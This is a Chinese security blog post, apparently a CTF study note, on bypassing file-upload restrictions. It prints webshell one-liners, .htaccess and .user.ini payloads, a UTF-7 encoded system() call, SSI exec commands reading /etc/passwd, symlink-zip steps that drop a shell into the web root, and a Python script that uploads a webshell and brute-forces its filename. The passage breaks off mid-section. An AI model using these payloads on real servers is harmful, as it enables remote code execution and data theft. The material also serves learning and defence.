@@ -1,0 +1,341 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>文件上传 | anz</title><meta name="author" content="anz"><meta name="copyright" content="anz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="MIME类型检测  MIME类型在html文件中使用content-type属性表示 常见文件名对应的MIME类型: gif —&gt; image&#x2F;gif,png —&gt; image&#x2F;png,jpg —&gt; image&#x2F;jpg,js —&gt; text&#x2F;javascript,htm&#x2F;html —&gt; text&#x2F;html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="https://aaanz.github.io/web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="anz">
+<meta property="og:description" content="MIME类型检测  MIME类型在html文件中使用content-type属性表示 常见文件名对应的MIME类型: gif —&gt; image&#x2F;gif,png —&gt; image&#x2F;png,jpg —&gt; image&#x2F;jpg,js —&gt; text&#x2F;javascript,htm&#x2F;html —&gt; text&#x2F;html">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg">
+<meta property="article:published_time" content="2022-11-26T14:28:11.314Z">
+<meta property="article:modified_time" content="2023-03-11T15:52:26.596Z">
+<meta property="article:author" content="anz">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://aaanz.github.io/web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '文件上传',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-11 23:52:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/75899c342847e73b.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">anz</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">文件上传</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-26T14:28:11.314Z" title="发表于 2022-11-26 22:28:11">2022-11-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-11T15:52:26.596Z" title="更新于 2023-03-11 23:52:26">2023-03-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="文件上传"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
+<li>MIME类型检测</li>
+</ul>
+<p>MIME类型在html文件中使用<code>content-type</code>属性表示</p>
+<p>常见文件名对应的MIME类型:</p>
+<p>gif —&gt; image&#x2F;gif,png —&gt; image&#x2F;png,jpg —&gt; image&#x2F;jpg,js —&gt; text&#x2F;javascript,htm&#x2F;html —&gt; text&#x2F;html</p>
+<ul>
+<li><p><strong>大小写绕过</strong></p>
+<p>例如Php,PhP</p>
+</li>
+<li><p><strong>文件名逻辑漏洞</strong></p>
+<p>Nginx 0.8.41 -1.4.3 &#x2F; 1.5.0 – 1.5.7</p>
+<p>上传png后访问png0x00.php即解析为php</p>
+</li>
+<li><p>某些情况下构造1.PHP. .(点空格点)</p>
+</li>
+<li><p><strong>后缀变形</strong></p>
+<p>Apache服务中可以利用黑名单中没有的,但是又能够被解析的后缀名</p>
+<p>例如<code>php、php3、php4、php5、php7、pht、phtml、phps</code></p>
+</li>
+<li><p><strong>00截断</strong></p>
+</li>
+</ul>
+<p>注:需要magic_quotes_gpc&#x3D;Off,php版本小于5.3.29</p>
+<p>POST情况下在第一个后缀名后加一个空格(<code>0x20</code>),使用bp-&gt;repeater-&gt;hex,将其改成<code>0x00</code></p>
+<ul>
+<li><strong>.htaccess文件上传解析</strong></li>
+</ul>
+<p>该文件可以理解为Apache的分布式配置文件,在一个特定的文档中放置,以作用于此目录及其所有子目录,管理员可以通过Apache的AllowOverride指令来设置<code>/etc/apache2/apache2.conf</code>,默认是NONE,需要为ALL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMacth&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用伪协议读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .xxx</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot;</span><br></pre></td></tr></table></figure>
+
+<p>不能出现某些关键字(如<code>ph</code>或<code>php</code>）时,使用反斜杠(<code>\</code>）拼接绕过,并开启短标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br><span class="line">p\</span><br><span class="line">hp_value au\</span><br><span class="line">to_append_file p\</span><br><span class="line">hp://filter/convert.base64-decode/resource=shell.jpg</span><br><span class="line">p\</span><br><span class="line">hp_value short_open_tag 1</span><br></pre></td></tr></table></figure>
+
+<p>绕过 <code>exif_imagetype()</code> 读取一个图像的第一个字节并检查其签名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">方法1：</span><br><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br><span class="line">方法2：</span><br><span class="line">在.htaccess前添加\x00\x00\x8a\x39\x8a\x39(要在十六进制编辑器中添加,或者使用python的bytes类型)</span><br><span class="line">\x00\x00\x8a\x39\x8a\x39 是wbmp文件的文件头</span><br><span class="line">.htaccess中以\x00开头的同样也是注释符,所以不会影响.htaccess</span><br></pre></td></tr></table></figure>
+
+<p>绕过&lt;?&#x3D;过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">utf-7编码绕过</span><br><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt;</span><br><span class="line"> Require all granted</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>自包含</li>
+</ul>
+<p>当前目录无php文件,自包含步骤</p>
+<p>a.设置访问权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt;    Require all granted    Order allow,deny    Allow from all&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+
+<p>b. .htaccess 指定当做 PHP 文件处理并解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php# &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>c.最终</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt;</span><br><span class="line"> Require all granted</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"># &lt;?=system($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>.user.ini上传</strong></li>
+</ul>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/1270588-20190903201901495-357084982.png" alt="1270588-20190903201901495-357084982"></p>
+<p>条件：</p>
+<p>a. 服务器脚本语言为PHP</p>
+<p>b. 服务器使用CGI／FastCGI模式</p>
+<p>c. 上传目录下要有可执行的php文件</p>
+<p>实例：</p>
+<p>上传<code>.user.ini</code>绕过黑名单检验</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  //绕过exif_imagetype()</span><br><span class="line">auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称,并包含该文件,就像使用require函数调用它一样。</span><br><span class="line">auto_append_file=a.jpg  //解析后进行包含</span><br></pre></td></tr></table></figure>
+
+<p>也可以进行远程文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=http://</span><br></pre></td></tr></table></figure>
+
+<p>优势：</p>
+<p>跟<code>.htaccess</code>后门比,适用范围更广,nginx&#x2F;apache&#x2F;IIS都有效,而<code>.htaccess</code>只适用于apache</p>
+<ul>
+<li>超长文件名截断上传</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows下目录路径最大长度为256字节</span><br><span class="line">Linux下目录最大长度为4096字节</span><br><span class="line">php&lt;5.2.9</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>./</code>或<code>.</code></p>
+<p>把最后的.jpg挤出去</p>
+<ul>
+<li>二次渲染绕过</li>
+</ul>
+<p>脚本……</p>
+<ul>
+<li>上传svg</li>
+</ul>
+<p>如果可以上传svg文件,那么必然存在xss,因为svg图片内容为xml标签</p>
+<ul>
+<li>shtml(SSI注入)</li>
+</ul>
+<p>当Web服务器为Apache和IIS(支持SSI功能的服务器）且开启了SSI与CGI支持</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;dir /&quot;--&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其他拓展名:<code>.stm</code>,<code>.shtml</code>,<code>.shtm</code></p>
+<ul>
+<li>(黑名单)NTFS隐写</li>
+</ul>
+<p>Windows 下 NTFS 文件系统的一个特性,即 NTFS 文件系统的存储数据流的一个属性::$DATA,当访问a.php::$DATA就会访问 a.php,这个特点可以用于黑名单绕过</p>
+<ul>
+<li>HTTP请求走私或双写文件或分块传输</li>
+</ul>
+<p>仅支持HTTP1.1</p>
+<p>分块传输消息体格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如要发送的内容(消息体)为：123456789  </span><br><span class="line">那么消息体的格式为：  </span><br><span class="line">9&lt;CR&gt;&lt;LF&gt;  </span><br><span class="line">123456789&lt;CR&gt;&lt;LF&gt;  </span><br><span class="line">0&lt;CR&gt;&lt;LF&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>分块传输可以在长度标识处加上<code>;</code>作为注释,这样能够识别Transfer-Encoding数据包的waf就无法识别出该数据包了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">9;kkkkk</span><br><span class="line">1234567=1</span><br><span class="line">4;ooo=222</span><br><span class="line">2345</span><br><span class="line">0</span><br><span class="line">(两个换行)</span><br></pre></td></tr></table></figure>
+
+<p>Burp 分块传输插件项目地址：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p>
+<ul>
+<li>配合Apache的解析缺陷</li>
+</ul>
+<p>Apache的解析漏洞主要特性是从后面开始检查后缀,按最后一个合法后缀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Apache2.4.7+php5</span><br><span class="line">上传aaa.php.asdasd成功</span><br></pre></td></tr></table></figure>
+
+<h3 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h3><ul>
+<li><p>情景</p>
+<p>文件上传后,检测是否合法,不合法就删除</p>
+</li>
+<li><p>利用方式</p>
+<p>在删除前访问到上传的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = &#x27;web.php&#x27;;</span><br><span class="line">$shell = &#x27;&lt;?php eval($_POST[&quot;key&quot;])?&gt;&#x27;;</span><br><span class="line">file_put_contents($file,$shell);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="软链接任意写-unzip"><a href="#软链接任意写-unzip" class="headerlink" title="软链接任意写(unzip)"></a>软链接任意写(unzip)</h4><p><code>unzip()</code>存在软链接攻击,发现可以通过上传一个软链接的压缩包,把特定文件像个钩子一样勾出来,实现任意文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s  		// linux的软链接 类似快捷方式</span><br><span class="line">ln -s /etc/passwd forever404    //会出现一个forever404文本 里面包含有/etc/passwd</span><br><span class="line">/proc/self	// 记录系统运行的信息状态 cwd指向当前进程运行目录的一个符号链接</span><br></pre></td></tr></table></figure>
+
+<p><strong>操作方式</strong></p>
+<p>先构造一个指向 &#x2F;var&#x2F;www&#x2F;html 的软连接:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html test</span><br><span class="line">zip --symlinks test.zip ./*</span><br></pre></td></tr></table></figure>
+
+<p>此时上传该test.zip,解压出里边的文件也是软连接 &#x2F;var&#x2F;www&#x2F;html 目录下</p>
+<p>接下来的思路就是想办法构造一个getshell文件让getshell文件正好解压在 &#x2F;var&#x2F;www&#x2F;html,此时就可以getshell</p>
+<p>构造第二个压缩包,先创建一个test目录(因为上一个压缩包里边目录就是test),在test目录下写一个shell文件,再压缩创建的test目录 此时压缩包目录架构是：test&#x2F;cmd.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir test</span><br><span class="line">cd test</span><br><span class="line">echo &quot;&lt;?php @eval($_GET[cmd]);&quot; &gt; cmd.php</span><br><span class="line">cd ..</span><br><span class="line">zip -r test.zip ./*</span><br></pre></td></tr></table></figure>
+
+<p>当上传这个压缩包时会覆盖上一个test目录,但是test目录软链接指向 &#x2F;var&#x2F;www&#x2F;html,解压的时候会把cmd.php放在 &#x2F;var&#x2F;www&#x2F;html,此时达到了getshell的目的</p>
+<h3 id="只解压一半的压缩包-解压出错）"><a href="#只解压一半的压缩包-解压出错）" class="headerlink" title="只解压一半的压缩包(解压出错）"></a>只解压一半的压缩包(解压出错）</h3><ul>
+<li><strong>Windows 7zip</strong></li>
+</ul>
+<p>7zip的容忍度很低,只要压缩包中某一个文件的CRC校验码出错,就会报错退出。</p>
+<p>修改方法：</p>
+<p>准备两个文件,一个PHP文件1.php,一个文本文件2.txt,其中1.php是webshell,然后将这两个文件压缩成shell.zip</p>
+<p>用010editor打开shell.zip,可以看到右下角有这个文件的格式信息,它被分成5部分,打开第4部分,其中有个deCrc,随便把值改成其他的值,然后保存</p>
+<p>此时用7zip解压就会出错,解压出的1.php是完好的,2.txt是一个空文件</p>
+<ul>
+<li><strong>PHP ZipArchive库</strong></li>
+</ul>
+<p>ZipArchive容忍度比较高,可以在文件名上下功夫</p>
+<p>比如,Windows下不允许文件名中包含冒号(:）,可以在010editor中将2.txt的deFileName属性的值改成2.tx:,此时解压就会出错,但1.php被保留了下来</p>
+<p>在Linux中也有类似的方法,可以将文件名改为5个斜杠(&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;）,此时Linux下解压也会出错,但1.php被保留了下来</p>
+<p>Tmp脚本爆破随机临时文件名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url = &quot;http://b718a952-ff8f-46e1-b071-4d96d9b3b90e.node3.buuoj.cn/&quot;</span><br><span class="line"></span><br><span class="line">path = url + &quot;/index.php/home/index/upload&quot;</span><br><span class="line">files = &#123;&quot;file&quot;:(&quot;a.txt&quot;,&#x27;a&#x27;), &quot;file1&quot;:(&quot;b.php&quot;, &#x27;&lt;?php eval($_GET[&quot;a&quot;]);&#x27;)&#125;</span><br><span class="line">r = requests.post(path, files=files)</span><br><span class="line">t1 = r.text.split(&quot;/&quot;)[-1].split(&quot;.&quot;)[0]</span><br><span class="line">param=json.loads(r.content)</span><br><span class="line">#json.loads()用于将str类型的数据转成dict</span><br><span class="line">print param</span><br><span class="line">t1 = int(t1, 16)</span><br><span class="line"></span><br><span class="line">j = t1</span><br><span class="line">while True:</span><br><span class="line">    path = url + &quot;/Public/Uploads/&quot;+param[&#x27;url&#x27;].split(&quot;/&quot;)[-2]+&quot;/%s.php&quot; % hex(j)[2:]</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(path,timeout=1)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">    if r.status_code == 429:#规避过于频繁访问导致的429</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        continue</span><br><span class="line">    elif r.status_code != 404:</span><br><span class="line">        print path</span><br><span class="line">        print r.text</span><br><span class="line">        break</span><br><span class="line">    print j, path, r.status_code</span><br><span class="line">    j -= 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Perl网站配合文件上传"><a href="#Perl网站配合文件上传" class="headerlink" title="Perl网站配合文件上传"></a>Perl网站配合文件上传</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings; </span><br><span class="line">use CGI;</span><br><span class="line">my $cgi= CGI-&gt;new;</span><br><span class="line">if ( $cgi-&gt;upload( &#x27;file&#x27; ) ) &#123; </span><br><span class="line">    my $file= $cgi-&gt;param( &#x27;file&#x27; );</span><br><span class="line">     while ( &lt;$file&gt; ) &#123; print &quot;$_&quot;; &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><code>param()</code>  返回一个列表的文件,但只有第一个文件被放入到下文接收变量中,如果我们传入了一个ARGV文件,那么Perl会将传入的参数作为文件名读出来.对正常文件上传进行修改即可</p>
+<ul>
+<li>读取任意文件</li>
+<li>命令执行</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/file.pl?/bin/bash%20-c%20ls$&#123;IFS&#125;/| </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230109185334355.png" alt="image-20230109185334355"></p>
+<h1 id="upload靶场"><a href="#upload靶场" class="headerlink" title="upload靶场"></a>upload靶场</h1><h2 id="更改content-type类型"><a href="#更改content-type类型" class="headerlink" title="更改content-type类型"></a>更改content-type类型</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) ||(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	上传.php文件抓包修改content-type类型为:image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif</p>
+<h2 id="上传未禁止类型"><a href="#上传未禁止类型" class="headerlink" title="上传未禁止类型"></a>上传未禁止类型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br></pre></td></tr></table></figure>
+
+<pre><code>   jsp   jspx   jspf   asp   asa   cer   aspx   php   php3   php4   php5   phtml  
+</code></pre>
+<h2 id="htaccess文件绕过"><a href="#htaccess文件绕过" class="headerlink" title=".htaccess文件绕过"></a>.htaccess文件绕过</h2><p>上传一个.htaccess文件名的文件内容为</p>
